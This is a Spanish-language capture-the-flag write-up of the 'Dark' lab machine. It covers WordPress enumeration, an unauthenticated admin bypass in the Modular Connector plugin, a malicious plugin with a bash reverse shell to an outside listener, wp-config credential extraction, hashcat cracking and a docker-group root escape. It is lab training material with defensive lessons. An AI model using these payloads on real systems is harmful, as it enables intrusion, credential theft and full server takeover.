# Writeup: Dark (HackSmarter — Medium)

Dark es una máquina **Media** que simula un entorno WordPress vulnerable. El recorrido comienza con la enumeración de un sitio WordPress que expone un usuario administrador a través de la API REST. Posteriormente, se identifica un plugin llamado **Modular Connector** con una vulnerabilidad crítica de escalada de privilegios (CVE-2026-23550) que permite obtener acceso al panel de administración sin autenticación. Una vez dentro, se sube un plugin malicioso para obtener una reverse shell como `www-data`. Tras enumerar el sistema, se descubren credenciales de la base de datos y se intenta crackear el hash del administrador sin éxito. Finalmente, se observa que el usuario `www-data` pertenece al grupo `docker`, lo que permite ejecutar un contenedor con montaje del sistema de archivos raíz y obtener acceso como `root`.

---

## 🎯 Objetivo / Scope

El equipo de Hack Smarter ha sido contratado para realizar una prueba de penetración contra el sitio web de la empresa "Dark". El objetivo es identificar vulnerabilidades en el sitio WordPress y demostrar su impacto, obteniendo acceso al sistema y elevando privilegios hasta `root`.

---

## Fase 1: Reconocimiento

Realizamos un escaneo de puertos con Nmap para descubrir los servicios expuestos:

```bash
sudo nmap -sS -p- --min-rate 500 -n -Pn -vv 10.1.148.99 -oG allPorts
```

**Resultado:**

```bash
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 62
80/tcp    open     http    syn-ack ttl 62
12288/tcp filtered unknown no-response
```

Solo los puertos 22 (SSH) y 80 (HTTP) están abiertos. Realizamos un escaneo de servicios y versiones:

```bash
nmap -sVC -p 22,80 10.1.148.99 -oN targeted
```

**Resultado:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:fa:00:85:4c:0d:97:79:7b:46:e4:86:1b:18:72:19 (ECDSA)
|_  256 ea:8d:af:2f:ec:15:d9:32:c0:94:6f:09:03:49:60:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.0
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Dark &#8211; Just another WordPress site
```

**Observaciones clave:**

- **WordPress 6.0** instalado.
- **Robots.txt** revela la ruta `/wp-admin/`.
- El servidor web ejecuta Apache en Ubuntu.

---

## Fase 2: Enumeración de WordPress

### 2.1 Enumeración de usuarios con WPScan

Usamos **WPScan**, la herramienta estándar para enumerar WordPress, para descubrir usuarios:

```bash
wpscan --url http://10.1.148.99 -e u
```

**Resultado:**

```bash
[+] Enumerating Users (via Passive and Aggressive Methods)

[+] streetcoderadmin
 | Found By: Rss Generator (Passive Detection)
 Brute Forcing Author IDs - Time: 00:00:01 <================================================> (10 / 10) 100.00% Time: 00:00:01
[i] 1 user(s) Identified.
```

WPScan detectó al usuario **`streetcoderadmin`**.

### 2.2 Confirmación mediante la API REST de WordPress

La API REST de WordPress, por defecto, expone los usuarios en `/wp-json/wp/v2/users`. Verificamos:

```bash
curl -s http://10.1.148.99/wp-json/wp/v2/users | jq
```

**Salida:**

```json
[
  {
    "id": 1,
    "name": "streetcoderadmin",
    "url": "http://172.16.1.84",
    "description": "",
    "link": "http://10.1.148.99/author/streetcoderadmin/",
    "slug": "streetcoderadmin",
    ...
  }
]
```

También podemos comprobarlo con `?author=1`:

```bash
curl -s http://10.1.148.99/?author=1
```

Ambos métodos confirman la existencia del usuario administrador.

---

## Fase 3: Enumeración de plugins

WPScan también permite enumerar plugins instalados. Usamos el modo de detección mixta (pasiva y agresiva):

```bash
wpscan --url http://10.1.148.99 --enumerate p --plugins-detection mixed
```

**Resultado clave:**

```bash
[+] modular-connector
 | Location: http://10.1.148.99/wp-content/plugins/modular-connector/
 | Last Updated: 2026-06-26 5:26pm GMT (1 month ago, per WordPress.org)
 | Active Installs: 40,000 (per WordPress.org)
 | Readme: http://10.1.148.99/wp-content/plugins/modular-connector/readme.txt
 | [!] The version is out of date, the latest version is 3.0.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.1.148.99/wp-content/plugins/modular-connector/, status: 403
 |
 | Version: 2.5.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.1.148.99/wp-content/plugins/modular-connector/readme.txt
```

El plugin **Modular Connector** (versión 2.5.0) está instalado. Es una versión antigua y vulnerable.

---

## Fase 4: Vulnerabilidad CVE-2026-23550 — Escalada de Privilegios en Modular Connector

### 4.1 Investigación de la vulnerabilidad

Buscando información sobre vulnerabilidades en Modular Connector, encontramos el **CVE-2026-23550**, una vulnerabilidad crítica de escalada de privilegios que afecta a versiones anteriores a la 2.5.2. El plugin expone rutas bajo el prefijo `/api/modular-connector/` y utiliza un sistema de enrutamiento similar a Laravel. Existe un mecanismo de autenticación que puede ser omitido mediante el parámetro `origin=mo` y `type` en la URL.

**¿Cómo funciona el bypass?**

El código del plugin tiene una función `isDirectRequest()` que determina si una petición es "directa" (es decir, que proviene del propio sistema Modular). Esta función devuelve `true` si se cumple alguna de estas condiciones:

- El User-Agent coincide con `ModularConnector/* (Linux)`.
- La URL contiene los parámetros `origin=mo` y `type` (con cualquier valor).

Cuando la petición se considera "directa", el middleware de autenticación se omite, y el plugin asume que la petición es legítima. Esto permite a un atacante sin autenticación acceder a rutas protegidas, incluyendo `/login/{modular_request}`.

### 4.2 Ruta crítica: `/login/{modular_request}`

El controlador `AuthController::getLogin()` recibe una solicitud y, si no se proporciona un ID de usuario, busca un usuario administrador existente (mediante `ServerSetup::getAdminUser()`) y lo autentica automáticamente. Luego devuelve una cookie de sesión válida y redirige al panel de administración.

**Impacto:** Un atacante puede obtener acceso completo al panel de administración de WordPress sin conocer las credenciales.

**Fuente de información:** El artículo de Patchstack sobre esta vulnerabilidad, que explica en detalle el mecanismo y cómo está siendo explotada activamente en la naturaleza.

---

## Fase 5: Explotación de la vulnerabilidad

### 5.1 Acceso al panel de administración

Simplemente accedemos a la siguiente URL:

```
http://10.1.148.99/api/modular-connector/login/anything/?origin=mo&type=xxx
```

Al cargar esta URL, el plugin autentica automáticamente al usuario `streetcoderadmin` y redirige a `/wp-admin/`. ¡Estamos dentro del panel de administración de WordPress!


## Fase 6: Reverse Shell mediante Plugin Malicioso

### 6.1 Preparación del plugin

Desde el panel de administración, vamos a **Plugins > Add New > Upload Plugin**. Necesitamos subir un archivo ZIP que contenga un plugin malicioso. Creamos un archivo `shell.php` con el siguiente contenido:

```php
<?php 
/**
 * Plugin Name: Shell
 * Description: Just a test
 */
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.200.75.15/443 0>&1'") ?>
```

**Nota:** La cabecera del plugin (nombre y descripción) es obligatoria para que WordPress lo reconozca como un plugin válido.

Creamos el archivo ZIP:

```bash
zip shell.zip shell.php
```

### 6.2 Subida y activación

Subimos el archivo `shell.zip` desde el panel de administración. La instalación es exitosa. Luego, hacemos clic en **Activate Plugin**.

En nuestra máquina Kali, tenemos un listener en el puerto 443:

```bash
nc -nlvp 443
```

Al activar el plugin, recibimos la conexión:

```bash
connect to [10.200.75.15] from (UNKNOWN) [10.1.148.99] 51570
bash: cannot set terminal process group (849): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dark:/var/www/172_16_1_84_/public/wp-admin$ whoami
www-data
```

Somos el usuario **`www-data`**.

---

## Fase 7: Enumeración del sistema

### 7.1 Archivo de configuración de WordPress

Buscamos el archivo `wp-config.php` para obtener las credenciales de la base de datos:

```bash
www-data@dark:/var/www/172_16_1_84_/public$ cat wp-config.php
```

**Contenido:**

```php
define( 'DB_NAME', 'wp60' );
define( 'DB_USER', 'wp60user' );
define( 'DB_PASSWORD', 'ChangeThis_DBPassword_123!' );
define( 'DB_HOST', 'localhost' );
```

Tenemos credenciales de la base de datos: `wp60user` / `ChangeThis_DBPassword_123!`.

### 7.2 Verificación del servicio MySQL

Comprobamos que MySQL está corriendo localmente:

```bash
www-data@dark:/var/www/172_16_1_84_/public$ ss -tlnp
```

```bash
LISTEN  0        80             127.0.0.1:3306           0.0.0.0:*
```

El puerto 3306 está abierto solo en localhost.

### 7.3 Conexión a la base de datos

Nos conectamos a MySQL con las credenciales obtenidas:

```bash
www-data@dark:/var/www/172_16_1_84_/public$ mysql -uwp60user -pChangeThis_DBPassword_123!
```

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp60               |
+--------------------+

MariaDB [wp60]> show tables;
+-----------------------+
| Tables_in_wp60        |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

MariaDB [wp60]> select * from wp_users;
+----+------------------+------------------------------------+------------------+----------------------+---------------------+---------------------+---------------------+-------------+------------------+
| ID | user_login       | user_pass                          | user_nicename    | user_email           | user_registered     | user_activation_key | user_status | display_name     |
+----+------------------+------------------------------------+------------------+----------------------+---------------------+---------------------+---------------------+-------------+------------------+
|  1 | streetcoderadmin | $P$By0dyWN5vKluY72Xe/IFimzmYjf4gQ/ | streetcoderadmin | admin@yourdomain.com | 2026-01-29 09:24:11 |                     |           0 | streetcoderadmin |
+----+------------------+------------------------------------+------------------+----------------------+---------------------+---------------------+---------------------+-------------+------------------+
```

### 7.4 Intento de cracking del hash

Extraemos el hash del usuario `streetcoderadmin` y lo guardamos en `hash.txt`. El hash es de tipo WordPress (phpass, modo 400 en hashcat):

```bash
echo '$P$By0dyWN5vKluY72Xe/IFimzmYjf4gQ/' > hash.txt
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```

El cracking falla, la contraseña no está en el diccionario `rockyou.txt`. Debemos buscar otra vía de escalada.

---

## Fase 8: Escalada a root mediante grupo Docker

### 8.1 Identificación del grupo Docker

Verificamos los grupos del usuario actual:

```bash
www-data@dark:/var/www/172_16_1_84_/public/wp-admin$ id
```

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data),121(docker)
```

**Observación crítica:** El usuario `www-data` pertenece al grupo **`docker`** (GID 121). Esto es una vulnerabilidad de escalada de privilegios muy grave.

**¿Por qué es peligroso?** El demonio de Docker (`dockerd`) se ejecuta siempre como `root`. Los miembros del grupo `docker` pueden comunicarse con el demonio y ejecutar comandos en contenedores. Al ejecutar un contenedor con montaje del sistema de archivos del host, se puede acceder a cualquier archivo del sistema como `root`.

### 8.2 Explotación del grupo Docker

Ejecutamos el siguiente comando para lanzar un contenedor de Ubuntu con el sistema de archivos raíz del host montado en `/mnt`:

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

**Explicación:**

- `-v /:/mnt`: Monta el directorio raíz del host (`/`) dentro del contenedor en la ruta `/mnt`.
- `--rm`: Elimina el contenedor al finalizar.
- `-it ubuntu`: Usa la imagen de Ubuntu de manera interactiva.
- `chroot /mnt bash`: Cambia la raíz del sistema de archivos a `/mnt` (el sistema host) y ejecuta `bash`.

Al ejecutarlo, el contenedor descarga la imagen de Ubuntu (si no está disponible) y nos da una shell como `root` dentro del sistema de archivos del host:

```bash
ed819469700f: Pull complete 
a3679419df18: Pull complete 
Status: Downloaded newer image for ubuntu:latest
root@a7a6ef881167:/# ls -la
total 20
drwx------  3 root root 4096 Jan 30 09:59 .
drwxr-xr-x 20 root root 4096 Jan 29 09:10 ..
-rw-------  1 root root  418 Jun 30 17:32 .bash_history
-rw-------  1 root root   25 Jan 29 09:28 root.txt
drwx------  3 root root 4096 Jan 30 09:59 snap
```

### 8.3 Obtención de las flags

Leemos la flag de root:

```bash
root@a7a6ef881167:~# cat root.txt
flag{docker-is-fun-0385}
```

También encontramos la flag de usuario en `/var/www/user.txt`:

```bash
root@a7a6ef881167:~# cat /var/www/user.txt
flag{w0redPress-2026-23550}
```

Ambas flags han sido obtenidas.

---

## 📌 Conclusión

Dark es una máquina **Media** que combina:

1. **Enumeración de WordPress** mediante WPScan y la API REST para descubrir el usuario `streetcoderadmin`.
2. **Detección del plugin Modular Connector** y explotación de **CVE-2026-23550** para obtener acceso administrativo sin autenticación.
3. **Subida de plugin malicioso** para obtener una reverse shell como `www-data`.
4. **Enumeración del sistema y extracción de credenciales** de la base de datos desde `wp-config.php`.
5. **Escalada a root** mediante el grupo `docker`, montando el sistema de archivos del host en un contenedor.

---

## 📚 Lecciones aprendidas

1. **La exposición de usuarios mediante la API REST de WordPress es un riesgo de enumeración**  
   La API REST de WordPress, habilitada por defecto, expone la lista de usuarios. Esto permite a un atacante obtener nombres de usuario válidos para ataques de fuerza bruta o para explotar vulnerabilidades de escalada de privilegios. Se recomienda deshabilitar este endpoint o restringir su acceso.

2. **Los plugins obsoletos son un vector de ataque crítico**  
   Modular Connector versión 2.5.0 contenía una vulnerabilidad de escalada de privilegios que permitió a un atacante sin autenticación obtener acceso administrativo. Mantener todos los plugins actualizados es esencial.

3. **Las cabeceras de plugins en WordPress son necesarias para la instalación**  
   Un archivo PHP sin la cabecera de plugin no será reconocido por WordPress. Esto es un detalle importante a tener en cuenta al subir shells maliciosas.

4. **El grupo Docker es un vector de escalada a root**  
   La pertenencia al grupo `docker` otorga privilegios equivalentes a `root`. Nunca se debe agregar usuarios no confiables al grupo `docker`.

5. **La enumeración del sistema es clave para encontrar vectores de escalada**  
   Al no poder crackear el hash de WordPress, la enumeración de grupos (`id`) reveló la pertenencia al grupo `docker`, lo que permitió la escalada final.

6. **El montaje del sistema de archivos del host en un contenedor es una técnica común de escalada**  
   Usar `docker run -v /:/mnt ... chroot /mnt bash` permite acceder a todo el sistema de archivos del host con permisos de `root`. Esta técnica debe ser bloqueada mediante políticas de seguridad.

7. **Las contraseñas almacenadas en `wp-config.php` son un objetivo habitual**  
   Las credenciales de la base de datos estaban en texto plano en el archivo de configuración. Aunque no fueron útiles para la escalada en este caso, representan un riesgo de exposición de datos.

---

**Writeup completado.** La máquina fue resuelta exitosamente.
